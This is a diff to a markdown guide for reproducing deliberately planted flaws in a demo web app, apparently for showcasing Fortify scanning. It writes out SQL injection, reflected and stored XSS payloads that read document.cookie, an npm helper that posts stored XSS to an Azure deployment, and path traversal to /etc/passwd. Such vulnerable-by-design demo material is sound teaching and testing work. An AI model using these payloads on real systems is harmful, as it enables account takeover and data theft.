@@ -28,8 +28,10 @@ TOKEN=$(curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
 curl -H "Authorization: ******" \
   "http://localhost:8888/api/v3/users?keywords=%27+OR+%271%27%3D%271"
 
-# Admin user search also vulnerable
-# UI: http://localhost:8888/app/admin/users?keywords=' OR '1'='1
+# The React admin user search is not vulnerable to this SQL injection: it loads
+# the admin summary and filters the returned users in the browser. Use the API
+# request above or the legacy admin page to exercise the vulnerable query.
+# Legacy UI: http://localhost:8888/admin/users?keywords=' OR '1'='1
 ```
 
 **Expected:** All users returned instead of filtered results.
@@ -43,15 +45,23 @@ curl -H "Authorization: ******" \
 
 ```
 http://localhost:8888/products?keywords=<script>alert(document.cookie)</script>
-http://localhost:8888/app/products?keywords=<script>alert(document.cookie)</script>
 http://localhost:8888/products?raw=true&keywords=<script>alert(1)</script>
 http://localhost:8888/login?error=<script>alert(1)</script>
-http://localhost:8888/app/login?error=<script>alert(1)</script>
-http://localhost:8888/app/login-mfa?error=<script>alert(1)</script>
-http://localhost:8888/app/admin/users?keywords=<script>alert(1)</script>
 ```
 
-**Expected:** Alert dialog pops — payload reflected unescaped via `<%- keywords %>` on the legacy page and `dangerouslySetInnerHTML` on the React catalog, login, and MFA pages.
+For the React pages, use an event-handler payload because browsers do not execute
+`<script>` elements inserted through `innerHTML`:
+
+```
+http://localhost:8888/app/products?keywords=<img src=x onerror=alert(document.cookie)>
+http://localhost:8888/app/login?error=<img src=x onerror=alert(document.cookie)>
+http://localhost:8888/app/login-mfa?error=<img src=x onerror=alert(document.cookie)>
+http://localhost:8888/app/admin/users?keywords=<img src=x onerror=alert(document.cookie)>
+```
+
+**Expected:** Alert dialog pops. The legacy pages execute the `<script>` payload
+because it is rendered into the server response. The React pages reflect the
+event-handler payload through `dangerouslySetInnerHTML`.
 
 ---
 
@@ -59,6 +69,34 @@ http://localhost:8888/app/admin/users?keywords=<script>alert(1)</script>
 
 **Via API review creation:**  
 **Fortify Tooling Detection:** SAST, DAST
+
+The repository includes a helper that signs in as `user1`, selects the first
+product, and creates the review with a stored-XSS payload:
+
+```bash
+# Local application
+npm run demo:stored-xss-review
+
+# Azure deployment from Bash
+npm run demo:stored-xss-review -- \
+  --base-url https://iwanode-h2achcbfgrfugzau.uksouth-01.azurewebsites.net
+```
+
+In PowerShell, use the npm argument separator explicitly on one line:
+
+```powershell
+npm run demo:stored-xss-review -- --base-url "https://iwanode-h2achcbfgrfugzau.uksouth-01.azurewebsites.net"
+```
+
+The helper defaults to this payload:
+
+```html
+<img src=x onerror=alert('StoredXSS')>
+```
+
+After it completes, open `/app/products/<product-id>` or
+`/app/user/reviews` while signed in as `user1` to render the stored comment.
+Use `--product-id`, `--comment`, and `--rating` to override the defaults.
 
 ```bash
 TOKEN=$(curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
@@ -105,7 +143,6 @@ Create file `/tmp/xxe.xml`:
 ## 5. Path Traversal (CWE-22)
 
 **Endpoint:** `GET /user/files/download/unverified?file=../../etc/passwd`  
-**React UI:** `http://localhost:8888/app/user/download-file`  
 **Fortify Tooling Detection:** SAST, DAST
 
 ```
@@ -113,6 +150,10 @@ http://localhost:8888/user/files/download/unverified?file=../../../etc/passwd
 ```
 
 **Expected:** `/etc/passwd` file contents returned.
+
+The React page at `/app/user/download-file` only renders download links for
+filenames returned by the server; it does not accept an arbitrary `file` query
+parameter. Use the legacy endpoint above to reproduce this finding.
 
 ---
 
